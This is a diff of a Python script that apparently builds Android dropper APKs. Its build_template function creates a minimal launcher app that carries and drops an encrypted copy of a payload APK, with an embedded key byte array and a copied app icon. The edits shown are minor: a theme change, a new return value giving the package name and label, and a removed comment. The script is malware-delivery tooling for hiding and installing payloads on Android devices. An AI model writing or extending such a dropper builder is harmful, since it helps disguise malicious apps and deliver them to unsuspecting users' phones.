@@ -206,7 +206,7 @@ def _manifest_xml(pkg: str, app_class: str, activity_class: str, provider_class:
         <activity
             android:name="{activity_class}"
             android:exported="true"
-            android:theme="@android:style/Theme.Material.Light.NoActionBar">
+            android:theme="@android:style/Theme.DeviceDefault.Light.NoActionBar">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -236,8 +236,9 @@ def _key_bytes_literal(key: bytes) -> str:
     return "new byte[]{" + ",".join(f"(byte)0x{b:02X}" for b in key) + "}"
 
 
-def build_template(payload_apk: str, session_dir: str, key: bytes) -> str:
-    """Build fresh minimal APK that drops an encrypted copy of payload_apk."""
+def build_template(payload_apk: str, session_dir: str, key: bytes):
+    """Build fresh minimal APK that drops an encrypted copy of payload_apk.
+    Returns (unsigned_apk_path, package_name, label)."""
     src_root = os.path.join(session_dir, "build")
     if os.path.exists(src_root):
         shutil.rmtree(src_root)
@@ -269,7 +270,6 @@ def build_template(payload_apk: str, session_dir: str, key: bytes) -> str:
     if icon:
         data, ext = icon
         if ext != ".png":
-            # aapt2 accepts .webp/.jpg but png name is safest reference-wise
             icon_path = os.path.join(drawable_dir, "ic_launcher" + ext)
         with open(icon_path, "wb") as f:
             f.write(data)
